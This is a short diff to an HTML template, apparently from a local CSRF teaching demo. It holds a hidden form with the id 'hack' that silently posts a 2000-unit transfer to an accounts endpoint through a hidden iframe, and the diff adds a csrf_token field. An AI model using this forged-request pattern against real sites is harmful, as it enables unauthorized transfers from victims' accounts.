@@ -1,6 +1,7 @@
 <form hidden id="hack" target="csrf-frame" action="http://localhost:5000/accounts" method="POST" autocomplete="off">
     <input type="number" name="amount" value="2000">
     <input type="number" name="account" value="2">
+    <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
 </form>
 <iframe hidden name="csrf-frame"></iframe>
 
